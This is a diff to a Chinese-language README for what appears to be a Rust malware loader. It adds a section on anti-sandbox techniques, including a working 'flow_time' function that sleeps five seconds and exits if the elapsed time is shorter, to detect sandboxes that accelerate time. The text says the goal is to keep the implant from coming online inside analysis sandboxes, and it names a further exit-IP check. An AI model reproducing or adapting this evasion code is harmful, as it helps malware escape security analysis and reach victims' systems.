@@ -103,7 +103,28 @@ rustup default stable-x86_64-pc-windows-msvc
 
 反沙箱
 ---
-反沙箱不是越多越好，只保留比较好用的两个，兼容绝大部分环境，并且尽量避免上传沙箱后虚拟主机上线
+反沙箱不是越多越好，只保留比较好用的三个，兼容绝大部分环境，并且尽量避免上传沙箱后虚拟主机上线
+
+### 流速检测 ###
+
+```
+pub fn flow_time() {
+    use std::time::{Duration, Instant};
+    use std::thread::sleep;
+
+    let start_time = Instant::now();
+
+    sleep(Duration::from_millis(5000));
+
+    let elapsed_time = start_time.elapsed();
+
+    if elapsed_time.as_millis() < 5000 {
+        std::process::exit(1);
+    }
+}
+```
+
+这个函数判断时间是否在沙箱内进行加速
 
 ### 检查出口 IP ###
 
